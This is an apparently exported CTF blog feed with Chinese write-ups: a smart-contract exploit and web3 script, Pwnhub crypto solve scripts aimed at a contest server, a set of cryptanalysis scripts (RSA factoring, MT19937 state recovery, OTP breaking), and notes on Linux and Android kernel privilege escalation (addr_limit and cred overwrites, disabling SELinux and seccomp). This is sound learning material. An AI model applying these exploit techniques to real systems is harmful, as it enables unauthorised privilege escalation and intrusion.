fuck.call(0x6bc344bc,0x20,0x18,email); &#125; function kill(address addr) public &#123; selfdestruct(addr); &#125; function pay() public payable&#123; &#125; function isOwner(address addr) public returns (uint256)&#123; if(isOwner!=1)&#123; isOwner = 1; return 0; &#125; else return 1; &#125; function () public payable &#123; if(msg.sender == 0x40a590b70790930ceed4d148bf365eea9e8b35f4)&#123; if(flag == 0)&#123; flag = 1; target.sell(num); &#125; &#125; &#125; &#125; exp.py 1234567891011121314151617181920212223242526# -*- coding:utf-8 -*-from web3 import Web3, HTTPProvidertrue = Truefalse = Falseweb3 = Web3(HTTPProvider('https://ropsten.infura.io/v3/42d···69'))fromAddr = '0xB1d6c···F8420'privateKey = '0xEAF046355A7···C36FE4FEE8EA71E'nonce = web3.eth.getTransactionCount(fromAddr)gasPrice = web3.eth.gasPriceaddr = '0x9350e28···fFD62F9417Fff'rawTx = &#123; 'to':addr, 'from': fromAddr, 'nonce': nonce, 'gasPrice': gasPrice, 'gas': 900000, 'value': web3.toWei(0, 'ether'), 'data': '0xae3f1447000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184e7a63354d5459334e444132514846784c6d4e7662513d3d0000000000000000'&#125;signedTx = web3.eth.account.signTransaction(rawTx, private_key=privateKey)hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()receipt = web3.eth.waitForTransactionReceipt(hashTx) 另外补充一个脚本，是Gaia哥弄的，主要就是爆破私钥使得这个账户创建的第一个合约地址结尾为0xfffPS:Gaia哥tql 123456789101112131415161718192021222324252627from bitcoin import *from ethereum.utils import denoms, privtoaddr, to_string, parse_int_or_hex, mk_contract_address, encode_hexfrom ethereum.utils import mk_contract_addressdef check(addr): addr1 = mk_contract_address(addr, 0) # print(encode_hex(addr1)) if int.from_bytes(addr1, byteorder='big') &amp; 0xfff == 0xfff: addr2 = mk_contract_address(addr1, 0) print(encode_hex(addr1)) return True # if int.from_bytes(addr2, byteorder='big') % 0xfff == 0: # print(encode_hex(addr1)) # print(encode_hex(addr2)) # return True return Falsepriv = random_key()addr = privtoaddr(priv)while not check(addr): priv = random_key() addr = privtoaddr(priv)print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(encode_hex(addr), priv))]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020-Pwnhub-密码学公开赛]]></title>
    <url>%2F2020%2F02%2F19%2F2020-Pwnhub-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%AC%E5%BC%80%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[简介2020年Pwnhub的密码学公开赛，做出两题，还有一题实在想不明白做法，等以后再研究研究。官方WP CoinFlip题目12345678910111213141516171819202122232425262728293031#!/usr/bin/env -S python3 -ufrom Crypto.PublicKey import ElGamalfrom Crypto.Util.number import bytes_to_longimport osfrom random import SystemRandomp = 89920298975143503603355071360939700550591407922242065556365328438507076180282197398213967403539918537000377407790675854125523262308319440885103050337161403840595981245921027345947546766650416109898337569343929638168518588430581320837700405309991316179363097700641403649662339768706999696604355253457738087899g = 5358175241224239681565352971614746319736919712851129402704021727006019580687455412863202343296662997105683370217761714672465916153210980406968620857248411694823855379754410695436318773571983868728108087797564875927297450936497475989604850544360508691110717233911580291458859569251675184514545939506977655392y = 9809883570049661508542126992393631918478221058616711897991871691848938615969469850516400742359680117878925758558830882425065054538428874262872130246351690279644236117955427717541894427111091263023680843960566066759500258363679404255239381504858494323208732973715063480188373952015070184694506814650003760582rnd = SystemRandom()pubkey = ElGamal.construct((p, g, y))msg1 = bytes_to_long(b"Head" + os.urandom(124))msg2 = bytes_to_long(b"Tail" + os.urandom(124))count = 0while True: print("Progress: %s/50" % count) coin = rnd.randrange(2) print(pubkey.encrypt([msg1, msg2][coin], rnd.randrange(1, p - 1))) break if int(input("Your guess (0/1): ")) == coin: print("Correct!") count += 1 if count == 50: print(open("flag").read()) exit() else: print("Wrong!") exit() 解题方法用雅可比符号做约束判断两个msg是否为同一开头，官方WP是这么说的 ElGamal 算法的 Semantic security 只有它所使用的群 G 满足 Decisional Diffie–Hellman assumption 才行（可以参见维基百科的 ElGamal encryption 词条），但是 pycrypto 的实现中，群 G 只是 mod 整数的乘法群，所以不满足。这样，我们可以用通过计算勒让德符号来分辨密文对应哪一条明文 可能我想到这个方法，但是不知道G不满足Decisional Diffie–Hellman assumption，所以也算瞎猫碰上死耗子吧hhh 解题脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import gmpy2from pwn import *p = 89920298975143503603355071360939700550591407922242065556365328438507076180282197398213967403539918537000377407790675854125523262308319440885103050337161403840595981245921027345947546766650416109898337569343929638168518588430581320837700405309991316179363097700641403649662339768706999696604355253457738087899g = 5358175241224239681565352971614746319736919712851129402704021727006019580687455412863202343296662997105683370217761714672465916153210980406968620857248411694823855379754410695436318773571983868728108087797564875927297450936497475989604850544360508691110717233911580291458859569251675184514545939506977655392y = 9809883570049661508542126992393631918478221058616711897991871691848938615969469850516400742359680117878925758558830882425065054538428874262872130246351690279644236117955427717541894427111091263023680843960566066759500258363679404255239381504858494323208732973715063480188373952015070184694506814650003760582def guess(idx): r.recvuntil('(') a = int(r.recvuntil(',',drop = True)) b = int(r.recvuntil(')',drop = True)) r.recvuntil('): ') r.sendline(str(idx)) res = r.recvuntil('!') return a,bdef guess2(a1,a2,b1,b2): r.recvuntil('(') idx = 1 a = int(r.recvuntil(',',drop = True)) b = int(r.recvuntil(')',drop = True)) ja1 = gmpy2.jacobi(a1*gmpy2.invert(a,p),p) ja2 = gmpy2.jacobi(a2*gmpy2.invert(a,p),p) jb1 = gmpy2.jacobi(b1*gmpy2.invert(b,p),p) jb2 = gmpy2.jacobi(b2*gmpy2.invert(b,p),p) print ja1,ja2,jb1,jb2 # success if jb1==ja1 and ja2==jb2 and ja1==-ja2 if (jb1==ja1 and ja2==jb2 and ja1==-ja2): idx=0 r.recvuntil('): ') r.sendline(str(idx)) res = r.recvuntil('!') #pause()r = remote('39.107.33.72',10003)while True: try: a1,b1 = guess(0) a2,b2 = guess(0) for i in range(50-2): guess2(a1,a2,b1,b2) r.interactive() pause() except: r.close() r = remote('39.107.33.72',10003)r.interactive() CoinFlip2题目 hint1：MT19937 随机数预测hint2：Mersenne Twister 算法的输出与内部状态成线性关系，求解线性方程组可以恢复内部状态 1234567891011121314151617#!/usr/bin/env -S python3 -uimport randomcount = 0while True: print("Progress: %s/50" % count) coin = random.getrandbits(1) if int(input("Your guess: ")) == coin: print("Correct!") count += 1 if count == 50: print(open("flag").read()) exit() else: print("Wrong!") count = 0 解题方法待补充PS:我拿到这题就想不明白，每次state只能转换为1bit，而每个state都有32bits，这个感觉是不可能完成的任务。但是hint却说就是这样的，我真的没想明白，等我去再研究一下再回来看看吧 解题脚本待补充 babyOT题目 hint1：Oblivious transferhint2：1-2 Oblivious transfer 中 RSA key 重复使用、msg 分布不均匀、不是论文题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env -S python3 -uimport osimport stringfrom Crypto.PublicKey import RSAfrom Crypto.Util.number import bytes_to_longfrom random import SystemRandomdef getkey(): if os.path.isfile("key.pem"): with open("key.pem", "rb") as f: key = RSA.importKey(f.read()) else: key = RSA.generate(2048) with open("key.pem", "wb") as f: f.write(key.exportKey("PEM")) return keydef random_str(n): return "".join([random.choice(string.ascii_letters) for _ in range(n)])if __name__ == "__main__": random = SystemRandom() key = getkey() print(key.n) print(key.e) while True: msg0 = bytes_to_long(random_str(2048 // 8 - 1).encode()) msg1 = bytes_to_long(random_str(2048 // 8 - 1).encode()) x0 = random.randrange(key.n) x1 = random.randrange(key.n) print(x0) print(x1) v = int(input()) print((msg0 + pow(v - x0, key.d, key.n)) % key.n) print((msg1 + pow(v - x1, key.d, key.n)) % key.n) guess0 = int(input()) guess1 = int(input()) if guess0 == msg0: print("You are on the half way of success, work harder!") if guess1 == msg1: print(open('flag').read()) exit() 解题方法一开始以为是随机数预测，后来给了hint2立马就知道怎么做了。先开一个进程传入接收到的x0，然后设delta = x0 - x1，则pow(delta,d,n)在RSA key重复使用的情况下一直是一个数字，那么再开一个进程去打一组msg1 + pow(delta,d,n)出来，这里面只有msg1不同，所以相减就是msg1 - msg1&#39;，msg的范围很小，可以从后往前一个字节一个字节爆破出来 解题脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# flag&#123;026c9c5ec0e6495a97f518f459e7769b&#125;import randomimport stringimport mathfrom pwn import *#context.log_level = 'debug'dic = string.ascii_lettersHOST = '39.107.33.72'PORT = 10001n = 29146525423102691639401650421066991207058945760578993274156106725628677659505967244678776864682546586246819809499537242360444325679433797730883356242909006578313863815598476321651691335584143947426865069270228508099452594013811720423833330403292759453038581071508324785022338407274104850847420759588368943421382073063592072845634359059763704065355508719554080581515441797500290040589816371312351351764881756150899413858590443268024058208849074306307901379348104212696375506807093769931896375130646532207961195389761538876600387808250572768672541587584935543975504019963314911796567222467219710684595858249563427217689e = 65537r = remote(HOST,PORT)def getdata(delta): rr = remote(HOST,PORT) rr.recvuntil('\n') rr.recvuntil('\n') x0 = int(rr.recvuntil('\n',drop=True)) x1 = int(rr.recvuntil('\n',drop=True)) # v - x0 x = (x1+delta)%n rr.sendline(str(x)) int(rr.recvuntil('\n',drop=True)) res = int(rr.recvuntil('\n',drop=True)) rr.close() return res def arr_copy(a1): tmp_arr = [] for i in a1: tmp_arr.append(i) return tmp_arrr.recvuntil('\n')r.recvuntil('\n')x0 = int(r.recvuntil('\n',drop=True))x1 = int(r.recvuntil('\n',drop=True))delta = (x0-x1)%nr.sendline(str(x0))msg0 = int(r.recvuntil('\n',drop=True))#msg0 = hex(msg0)[2:].decode('hex')# msg1 + (delta*d)%ntmp = int(r.recvuntil('\n',drop=True))res = []for i in range(300): res.append(getdata(delta))delta_arr = []for i in res: delta_arr.append(i - tmp)msg1 = ''for count in range(255): for c in dic: flag = 1 for d in delta_arr: data = (d + ord(c))&amp;0xff if data&gt;122 or data&lt;65 or 90&lt;data&lt;97: flag = 0 break if flag==1: msg1 = c + msg1 tmp_arr = [] for i in delta_arr: tmp_arr.append((i+ord(c))&gt;&gt;8) delta_arr = arr_copy(tmp_arr) breakprint delta_arrassert(len(msg1)==255)msg1 = int(msg1.encode('hex'),16)r.sendline(str(msg0))r.sendline(str(msg1))r.interactive() 总结做出来的两道都挺简单的，但是没做出来的那道从理论上来说就难多了，而且自己也不擅长这种类型的题，可能等以后有时间好好研究下吧。PS：拿了两个邀请码挺爽的hhhh]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些有关Crypto的脚本]]></title>
    <url>%2F2020%2F02%2F12%2F%E4%B8%80%E4%BA%9B%E6%9C%89%E5%85%B3Crypto%E7%9A%84%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[简介一些在网上看到的Crypto脚本 Adleman-Manders-Miller rth Root Extraction Method用处：在有限域内开N次根脚本出处 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import randomimport time​# About 3 seconds to rundef AMM(o, r, q): start = time.time() print('\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:&#123;&#125;'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:&#123;&#125;, t:&#123;&#125;'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:&#123;&#125;'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - dicreat_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print("Finished in &#123;&#125; seconds.".format(end - start)) print('Find one solution: &#123;&#125;'.format(result)) return resultdef findAllPRoot(p, e): print("Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.".format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print("Finished in &#123;&#125; seconds.".format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print("Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print("Finished in &#123;&#125; seconds.".format(end - start)) return all_mpc = p = e = 0x1337cp = c % pmp = AMM(cp, e, p)p_proot = findAllPRoot(p, e)mps = findAllSolutions(mp, p_proot, cp, p) Tonelli-Shanks用处：在有限域内开2次根脚本出处 1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: utf-8 -*-def legendre(a, p): return pow(a, (p - 1) // 2, p)def tonelli(n, p): assert legendre(n, p) == 1, "not a square (mod p)" q = p - 1 s = 0 while q % 2 == 0: q //= 2 s += 1 if s == 1: return pow(n, (p + 1) // 4, p) for z in range(2, p): if p - 1 == legendre(z, p): break c = pow(z, q, p) r = pow(n, (q + 1) // 2, p) t = pow(n, q, p) m = s t2 = 0 while (t - 1) % p != 0: t2 = (t * t) % p for i in range(1, m): if (t2 - 1) % p == 0: break t2 = (t2 * t2) % p b = pow(c, 1 &lt;&lt; (m - i - 1), p) r = (r * b) % p c = (b * b) % p t = (t * c) % p m = i return rn = p = r = tonelli(n, p) Pollard’s p-1 method用处：当整数n的因数p的欧拉函数p-1为B-smooth的时候，用于分解整数n脚本出处 123456789101112131415161718192021222324252627282930# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef gcd(a,b): while b != 0: t = b b = a % b a = t return adef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1n = 10236770740000404879446363554491944298329607696172291820947403596640677847656773105186621054093436194932196210867090944656886354113645373581971157722715051p = factor(n)print("p",p) Pollard Rho用处：当整数n的因数p和q的欧拉函数(p-1)和(q-1)有大公因数时，用于分解ntips：好像针对n的生成方式有另一个变种，但我忘了，到时候补上 1234567891011121314151617181920212223242526272829303132def gcd(a,b): while b != 0: t = b b = a % b a = t return adef Pollard_Rho(num): y = 2 x = 2 factor = 1 count = 0 if num==1: return 1 else: if num % 2 ==0: return 2 else: while factor == 1: if count %1000 == 0: print count x = (x*x + 1) % num y = (((y*y + 1) % num) ^ 2 + 1) % num factor = gcd( abs(x - y), num ) count += 1 return factorn = 33774167600199691072470424898842928168570559940362770786060699320989546851695106466924163816843729828399984649770900793014896037884774039660562546937090412844276185560384964983508291174867808082182386566813393157054259464108858158903739578119760394228341564696225513954400995543629624209942565369972555679980359992955514826589781286738100616149226885302403505062415492679633217275379153421830105021673417544608398249866398042786421630495968810854036782025120509999022773806069591080190166920079688217334968528641747739241234353918892029263544388161160427668518991666960251381106788899451912317001247537576428186291689res = Pollard_Rho(n)print (res) Gauss Lattice Reduction用处：在lattice里求最短向量，传入的参数为两个基向量脚本出处 123456789# sagedef GaussLatticeReduction(v1, v2): while True: if v2.norm() &lt; v1.norm(): v1, v2 = v2, v1 m = round( v1*v2 / v1.norm()^2 ) if m == 0: return (v1, v2) v2 = v2 - m*v OTP attack用处：OTP attack脚本出处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139# coding:utf8# by https://findneo.github.io/def getCipher(file='cipher.txt'): '''从文件中读取十六进制串，返回十六进制数组 ''' c=''.join(map(lambda x:x.strip(),open('cipher.txt').readlines())).decode('base_64') cc= [ord(i) for i in c] # print cc,len(cc) return cc # c = open(file).read() # codeintlist = [] # codeintlist.extend( # (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) # return codeintlistdef getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPooldef calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return keydef getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqListdef vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plaindef main(): ps = [] ks = [] ss = [] ps.extend(xrange(0xff)) ks.extend(xrange(0x20,0x80)) ss.extend(xrange(1, 50)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) print ''.join(map(chr,key))if __name__ == '__main__': main() Groebner用处：RSA Related Message Attack的拓展形式 0 12345678910111213141516n = 16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649e = 17c1 = c2 = c3 = c = R.&lt;x,y,z&gt; = PolynomialRing(Zmod(n))P = x^e - c1Q = y^e - c2S = z^e - c3U = x+y+z-cI = R.ideal([P,Q,S,U])B = I.groebner_basis()# print B Mersenne Twister-32bits break用处：32bits的random预测，自己加了个prevState的方法脚本出处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#coding=utf-8import randomwith open('output.txt','r') as f: d = f.readlines() data = [] for i in d: data.append(int(i,10))def unBitshiftRightXor (value,shift): i = 0 result = 0 while i * shift &lt; 32: partMask = right((-1 &lt;&lt; (32 - shift)) , (shift * i)) part = value &amp; partMask value ^= right(part , shift) result |= part i+=1 return resultdef unBitshiftLeftXor(value, shift, mask): i = 0 result = 0 while i * shift &lt; 32: partMask = right(-1 , (32 - shift)) &lt;&lt; (shift * i) part = value &amp; partMask value ^= (part &lt;&lt; shift) &amp; mask result |= part i += 1 return resultdef rev(nums): state=[] for i in nums: value = i value = unBitshiftRightXor(value, 18) value = unBitshiftLeftXor(value, 15, 0xefc60000) value = unBitshiftLeftXor(value, 7, 0x9d2c5680) state.append(unBitshiftRightXor(value, 11)) return statedef sign(iv): if(iv&amp;0x80000000): iv = -0x100000000 + iv return ivdef nextState(state): for i in range(624): y = (state[i] &amp; 0x80000000) + (state[(i + 1) % 624] &amp; 0x7fffffff) next = right(y,1) next ^= state[(i + 397) % 624] if ((y &amp; 1L) == 1L): next ^= 0x9908b0df state[i] = next return statedef prevState(state): for i in range(623,-1,-1): result = 0 tmp = state[i] tmp ^= state[(i+397)%624] if((tmp &amp; 0x80000000) == 0x80000000): tmp ^= 0x9908b0df result = (tmp &lt;&lt; 1) &amp;0x80000000 tmp = state[(i - 1 + 624) % 624] tmp ^= state[(i + 396) % 624] if ((tmp &amp; 0x80000000) == 0x80000000): tmp ^= 0x9908b0df result |= 1 result |= (tmp &lt;&lt; 1) &amp; 0x7fffffff state[i] = result return statedef nextNumber(state): currentIndex=0 tmp = state[currentIndex] tmp ^= right(tmp , 11) tmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680 tmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000 tmp ^= right(tmp , 18) return tmpdef right(n,bit): #python没有&gt;&gt;&gt;运算符，这个函数用作代替 x=n if n&lt;0 and bit&gt;0: n=(2147483648*2+n)&gt;&gt;bit else: n=n&gt;&gt;bit return ndef crack_prng(outputs_624_list): state=rev(outputs_624_list) stateList = state[:] nextState(state) r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return rr = crack_prng(data[:624])for i in range(1000-624): assert(r.getrandbits(32) == data[624+i]) Babai用处：解决CVP问题的一个算法 1234567def Babai(Lattice, target): M = Lattice.LLL() G = M.gram_schmidt()[0] diff = target for i in reversed(range(M.nrows())): diff -= M[i] * ((diff * G[i]) / (G[i] * G[i])).round() return target - diff]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xman笔记]]></title>
    <url>%2F2020%2F01%2F11%2FXman%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简介在Xman随便记的一点东西 standard/usr/bin/x86_64/usr/bin/i386 堆喷射堆风水 TK 完美越过DEP和ASLR 袁哥dve bypass mprotect改权限dl_resolve malloc_hook写one_gadget不行可以写relloc_hook然后写one_gadget 没有设置stdin缓冲区的时候，使用scanf、getchar获取内容时，如果输入字符串比较长会调用 malloc 来分配内存，所以可以把fastbin放入smallbin kernelcpio -idmv &lt; *.cpiofind . | cpio -o -H newc &gt; *.cpio find . | cpio -o –format=newc &gt; ../rootfs.img etc/init/rcS /proc/kallsyms 记录了所有函数地址 32位：pushl iret64位：pushq iretq编译用-no-pie调试加/dev/null -s ./extract-vmlinux ./bzImage &gt; vmlinux swapgs qemu-system-i386 -hda ./rootfs.img -kernel linux/arch/x86/boot/bzImage -append ‘console=ttyS0 root=/dev/sda rw nokaslr quiet’ -m 128M -nographic -s -monitor /dev/null set architecture i386:x64-32gdb ./vmlinuxtarget remote:1234b net/sctp/socket.c:1846gcc exp.c -o exp -pthread -lsctp –static lsmod获取基地址ida改基地址 edit-&gt;segements-&gt;rebaseset architecture i386:x86-64add-symbol-file ./baby.ko 0xFFFFFFFFC0002000 ida鼠标移动到要的地方 按tab cat /proc/kallsyms | grep commit_credscat /proc/kallsyms | grep prepare_kernel_cred ./extract-vmlinux bzImage &gt;&gt; vmlinux lsmodcat /proc/cpuinfocat /proc/slabinfo 深入理解计算机系统 armrizzo恢复符号表qemu-arm-static -g 1234 ./typogdb-multiarch ./typotarget remote:1234 context.arch = ‘arm’context.arch = ‘arm64’ qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./baby_armbinwalk -ME提取文件1.固件的文件系统附带提取程序2.GPL(源码)可能包含加密解密的逻辑ASLR=1 brk分配的堆不随机化ASLR=2 全随机化 /usr/arm-linux-gnueabihf android通过PC最低位来切换1: ARM -&gt; THUM0: THUM -&gt; ARM ARM流水线：指令执行时PC已经指向下下条指令 ARM64: W0-W30来访问X0-X30的低32位 Dalvik/ART:ART通过硬编码来提升速度 • /dev/binder – framework和app之间IPC通信桥梁• /dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁• /dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁 PAN（Privileged Access Never） 相当于SMAPPXN（Privileged Execute Never） 相当于SMEP SECCOMP:Android8.0之后，影响所有zygote孵化出来的进程shell中执行exp不会受到限制apk中执行exp会受到seccomp限制 - 比如无法调用setuid、chroot、mount等 AVB（Android Verified Boot 启动时验证） – 启动时验证boot、system、vendor等是否被篡改 – Persistent root克星 – 8.0之后的通过漏洞的root方案都是非persistent – Magisk使用tmpfs临时挂载system等分区AVB2.0 回滚保护，防止回滚到有漏洞的版本 内核栈和thread_info共用一片内存区域 1234union thread_union&#123; struct thread_info thread_info; unsigned long stack[THREAD_SIZE/sizeof(long)]; &#125;; addr_limit 用户态0x7ffffffff000(没有kaslr) 12345678struct thread_info &#123; unsigned long flags; /* low level flags */ mm_segment_t addr_limit; /* address limit */ struct task_struct *task; /* main task structure */ struct exec_domain *exec_domain; /* execution domain */ struct restart_block restart_block; int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; bug */ int cpu; /* cpu */ &#125;; 123456789101112131415161718struct task_struct &#123; volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ void *stack; // contains addr_limit unsigned int flags; /* per process flags, defined below */ ... struct list_head tasks; ... struct mm_struct *mm, *active_mm; #ifdef CONFIG_COMPAT_BRK unsigned brk_randomized:1; ... /* process credentials */ const struct cred __rcu *real_cred; /* objective and real subjective task const struct cred __rcu *cred; /* effective (overridable) subjective task char comm[TASK_COMM_LEN]; ... struct seccomp seccomp; &#125; 找到一个task_struct即可以找到其他所有task_struct 双链表保存 123struct list_head &#123; struct list_head *next, *prev; &#125;; 内核关键全局变量 – selinux_enforcing – selinux_enabled – init_task 关闭addr_limit(绕过PXN) 内核线程栈底偏移8字节即为addr_limit 将addr_limit改为-1（ 0xffffffffffffffff） 关闭之后即可任意读写内核 关闭DAC 修改进程安全凭证cred中进程id相关值 uid、gid等改为init进程的值 关闭CAP 修改进程安全凭证cred中的cap相关值 cap_inheritable等改为init进程的值 关闭SELinux 修改SELinux相关关键全局变量 selinux_enforcing和selinux_enabled置0 修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、keycreate_sid、 sockcreate_sid修改为init进程的值 关闭SECCOMP 修改thread_info中的flags，将seccomp位置0 #define TIF_SECCOMP 11 #define _TIF_SECCOMP (1 &lt;&lt; TIF_SECCOMP) 修改task_struct中的seccomp中的mode为0 struct seccomp { int mode; struct seccomp_filter *filter; }; 内核任意地址读写 用户态不能直接访问内核态 0xffffffffffffff00 = 0 (X) 需要借助内核函数完成内核任意地址读写 系统调用由内核完成 寻找系统调用中判断参数合法的方式 -&gt; addr_limit read/write、readv/writev、recvmsg/sendmsg等 这些命令会check addr_limit，所以就可以写内核]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pwn tw 刷题记录]]></title>
    <url>%2F2019%2F09%2F13%2FPwn-tw-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
